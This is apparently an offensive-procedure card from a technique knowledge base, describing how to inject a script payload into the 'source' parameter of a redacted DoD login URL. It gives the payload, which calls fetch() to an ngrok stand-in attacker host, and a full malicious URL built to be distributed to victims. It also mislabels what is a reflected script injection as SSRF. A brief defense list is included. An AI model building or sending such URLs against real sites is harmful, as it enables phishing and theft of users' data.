---
id: proc-uuid-2
name: Craft and Inject SSRF Payload into Login URL
tags:
  - ssrf
  - payload
  - injection
  - javascript
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:02.278Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft and Inject SSRF Payload into Login URL

## Summary

This procedure involves constructing a JavaScript payload using the fetch API and injecting it into the 'source' parameter of the DoD login page URL, exploiting insufficient input sanitization to trigger server-side requests to an external domain.

## Description

The vulnerability allows arbitrary JavaScript injection via the 'source' query parameter on the login page. The payload uses a script tag to execute fetch('attacker-url'), forcing the server to make a cross-domain request when the page is accessed. This targets web platforms with client-side rendering of unsanitized parameters. Prerequisites include access to the target URL and a prepared ngrok URL. Outcomes: A malicious URL that, when visited, leaks victim data via SSRF.

## Requirements

1. Access to the target login page URL (https://www.█████████)
2. Valid ngrok public URL from prior setup
3. Browser for URL construction and testing (e.g., Firefox)

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all query parameters, stripping script tags and external fetches
- Implement Content Security Policy (CSP) to restrict script execution and fetch origins
- Log and alert on unusual query parameter lengths or script-like content in URLs

## Objectives

1. Exploit lack of input validation in 'source' parameter
2. Create a distributable malicious URL for victim targeting
3. Ensure payload triggers server-side request without client-side errors

## Instructions

### Step 1: Access Target Page

**Context**: Load the base login page to understand the URL structure for parameter injection.

**Command** (Browser):
```bash
# Open in Firefox
firefox https://www.█████████
```

> Inspect the URL and identify the 'source' parameter position. Ensure the page loads normally.

### Step 2: Construct Payload

**Context**: Build the injection string to close existing tags and insert the script with fetch.

**Command** (Manual Construction):
```bash
# Payload: '><script>fetch('https://your-ngrok-url.ngrok.io')</script>'
# No CLI; manual string building
```

> Replace 'https://your-ngrok-url.ngrok.io' with the actual ngrok domain. This payload breaks out of any attribute context and executes the fetch.

### Step 3: Assemble Malicious URL

**Context**: Append the payload to the 'source' parameter and add other query params for realism.

**Command** (URL Building):
```bash
# Full URL example: https://www.█████████?...&source='><script>fetch('https://your-ngrok-url.ngrok.io')</script>&server=submit.moboard.com&display=Please+log+on&title=%3C
```

> Encode special characters if needed (e.g., %3C for <). Test the URL in a safe environment to confirm injection without immediate execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]

## Tags

- ssrf
- payload
- injection
- javascript
